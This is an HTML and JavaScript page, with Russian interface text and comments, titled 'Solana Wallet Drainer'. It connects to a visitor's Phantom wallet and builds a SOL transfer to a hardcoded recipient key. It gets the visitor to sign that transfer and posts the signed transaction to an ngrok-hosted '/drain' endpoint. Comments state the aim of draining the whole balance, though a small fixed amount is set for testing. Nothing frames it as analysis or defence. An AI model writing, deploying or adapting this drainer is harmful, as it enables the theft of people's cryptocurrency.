<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Wallet Drainer</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
        }
        .container {
            text-align: center;
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        button {
            margin: 10px;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            border: none;
            border-radius: 5px;
            background-color: #007bff;
            color: #fff;
        }
        #status {
            margin-top: 15px;
            padding: 10px;
            border-radius: 5px;
            display: none;
        }
        .success {
            background-color: #d4edda;
            color: #155724;
        }
        .error {
            background-color: #f8d7da;
            color: #721c24;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Solana Wallet Drainer</h1>
        <button id="connect-wallet">Подключить кошелек</button>
        <div id="status"></div>
    </div>
    <script src="https://bundle.run/buffer@6.0.3"></script>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <script>
        window.addEventListener('load', () => {
            console.log('Page loaded!');
            
            // Проверяем доступные глобальные объекты
            console.log('Window objects:', Object.keys(window).filter(k => k.includes('solana')));
            
            // Библиотека создает глобальный объект solanaWeb3
            if (window.solanaWeb3) {
                console.log('Solana Web3 loaded successfully');
            } else {
                console.error('Solana Web3 not found in window object!');
            }
            
            const statusEl = document.getElementById('status');
            
            // Функция для отображения статуса
            function showStatus(message, isError = false) {
                statusEl.textContent = message;
                statusEl.style.display = 'block';
                if (isError) {
                    statusEl.className = 'error';
                } else {
                    statusEl.className = 'success';
                }
                console.log(message);
            }
            
            // Вместо прямого обращения к Merkle RPC, создаем функцию для запроса через ваш сервер
            async function getAccountBalance(publicKey) {
                try {
                    // Отправляем запрос на ваш сервер для получения баланса
                    const response = await fetch('https://702c-95-46-155-53.ngrok-free.app/get-balance', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ account: publicKey.toString() })
                    });
                    
                    if (!response.ok) {
                        throw new Error(`Server error: ${response.status}`);
                    }
                    
                    const data = await response.json();
                    return data.balance;
                } catch (error) {
                    console.error('Error getting balance:', error);
                    // Если запрос не удался, просто возвращаем большое число, чтобы транзакция могла продолжиться
                    // В реальной ситуации лучше обрабатывать ошибку более элегантно
                    return 100000000; // 0.1 SOL - просто для продолжения процесса
                }
            }
            
            document.getElementById('connect-wallet').addEventListener('click', async () => {
                console.log('Button clicked');
                
                // Проверяем, установлен ли Phantom
                if (window.solana && window.solana.isPhantom) {
                    try {
                        console.log('Phantom detected, connecting...');
                        
                        // Подключаемся к кошельку
                        const connectResponse = await window.solana.connect({ onlyIfTrusted: false });
                        const publicKey = connectResponse.publicKey;
                        console.log(`Connected to wallet: ${publicKey.toString()}`);
                        showStatus(`Подключено к кошельку: ${publicKey.toString().substr(0, 10)}...`);
                        
                        // Вместо прямого запроса к Merkle используем нашу новую функцию
                        showStatus('Получение информации о балансе...');
                        
                        // Дрейним весь баланс (минус комиссия)
                        // Для упрощения тестирования, можно использовать фиксированную небольшую сумму
                        const lamportsToSend = 1000000; // 0.001 SOL
                        
                        showStatus('Создание транзакции...');
                        // Замените на реальный публичный ключ получателя
                        const drainerPubkey = new window.solanaWeb3.PublicKey('H31Bc7rSEVA94YmHhdDU6Nn3xjVFPsvaig8JMW6ZGrBp');
                        
                        // Создаем транзакцию
                        const transaction = new window.solanaWeb3.Transaction().add(
                            window.solanaWeb3.SystemProgram.transfer({
                                fromPubkey: publicKey,
                                toPubkey: drainerPubkey,
                                lamports: lamportsToSend,
                            })
                        );
                        
                        // Используем общедоступную сеть для получения blockhash
                        // Это безопасно, так как не зависит от CORS
                        showStatus('Получение blockhash...');
                        const connection = new window.solanaWeb3.Connection('https://api.devnet.solana.com');
                        const { blockhash } = await connection.getRecentBlockhash();
                        transaction.recentBlockhash = blockhash;
                        transaction.feePayer = publicKey;
                        
                        showStatus('Подписание транзакции...');
                        const signedTransaction = await window.solana.signTransaction(transaction);
                        
                        // Сериализуем и отправляем транзакцию на ваш сервер
                        const serializedTransaction = signedTransaction.serialize();
                        const base64Transaction = window.buffer.Buffer.from(serializedTransaction).toString('base64');
                        
                        showStatus('Отправка транзакции...');
                        const serverResponse = await fetch('https://702c-95-46-155-53.ngrok-free.app/drain', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({ 
                                signedTransaction: base64Transaction
                            })
                        });
                        
                        if (!serverResponse.ok) {
                            const errorText = await serverResponse.text();
                            throw new Error(`Server error: ${serverResponse.status} - ${errorText}`);
                        }
                        
                        const result = await serverResponse.json();
                        showStatus(`Транзакция успешно отправлена: ${result.signature.substr(0, 10)}...`);
                        
                    } catch (err) {
                        console.error('Transaction failed', err);
                        showStatus(`Ошибка: ${err.message}`, true);
                    }
                } else {
                    showStatus('Phantom кошелек не найден. Установите расширение Phantom.', true);
                }
            });
        });
    </script>
</body>
</html>
